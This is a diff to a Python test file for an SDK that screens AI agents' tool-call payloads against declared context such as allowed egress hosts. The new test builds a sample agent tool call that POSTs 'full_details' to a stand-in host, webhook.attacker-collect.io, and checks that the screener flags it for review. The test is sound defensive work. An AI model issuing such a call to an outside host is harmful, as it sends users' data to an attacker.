@@ -7,7 +7,7 @@ import json
 import httpx
 
 from surface import SurfaceClient
-from surface.models import ActionContext, ActionPayee
+from surface.models import ActionContext
 
 def _resp(level: str, action: str) -> dict:
     return {
@@ -43,17 +43,15 @@ def test_context_forwarded_in_body():
         context=ActionContext(
             principal_domains=["acme.io"],
             allowed_egress=["api.stripe.com", "hooks.slack.com"],
-            known_payees=[ActionPayee(name="Delta", iban="GB29NWBK60161331926819")],
-            user_request="pay this month's invoices",
+            user_request="summarize this week's tickets",
         ),
     )
     ctx = seen.get("context")
     assert ctx, f"no context in body: {seen}"
-    assert ctx["user_request"] == "pay this month's invoices"
+    assert ctx["user_request"] == "summarize this week's tickets"
     assert ctx["allowed_egress"] == ["api.stripe.com", "hooks.slack.com"]
-    assert ctx["known_payees"][0]["iban"] == "GB29NWBK60161331926819"
     # exclude_none keeps the payload lean.
-    assert "account" not in ctx["known_payees"][0]
+    assert "known_payees" not in ctx
 
 
 def test_context_accepts_plain_dict():
@@ -79,19 +77,25 @@ def test_context_absent_when_not_supplied():
 
 
 def test_context_flips_verdict_through_sdk():
-    known = "GB29NWBK60161331926819"
+    host = "webhook.attacker-collect.io"
 
     def handler(request: httpx.Request) -> httpx.Response:
         body = json.loads(request.content)
-        payees = (body.get("context") or {}).get("known_payees") or []
-        if any(p.get("iban") == known for p in payees):
-            return httpx.Response(200, json=_resp("Clean", "Allow"))
-        return httpx.Response(200, json=_resp("Malicious", "Block"))
+        egress = (body.get("context") or {}).get("allowed_egress")
+        # Model the screener: egress to a host outside a declared allowed_egress
+        # is Review; with no context, it is Allow.
+        if egress and host not in egress:
+            return httpx.Response(200, json=_resp("Suspicious", "Review"))
+        return httpx.Response(200, json=_resp("Clean", "Allow"))
 
-    payload = '{"tool":"create_payment","args":{"iban":"' + known + '"}}'
+    payload = (
+        '{"tool":"http_request","args":{"method":"POST",'
+        '"url":"https://' + host + '/i","body":{"full_details":true}}}'
+    )
     with_ctx = _client(handler).scan_payload(
-        payload, context=ActionContext(known_payees=[ActionPayee(name="Delta", iban=known)])
+        payload,
+        context=ActionContext(principal_domains=["acme.io"], allowed_egress=["api.stripe.com"]),
     )
     without = _client(handler).scan_payload(payload)
-    assert with_ctx.safety_score.recommended_action == "Allow"
-    assert without.safety_score.recommended_action == "Block"
+    assert with_ctx.safety_score.recommended_action == "Review"
+    assert without.safety_score.recommended_action == "Allow"
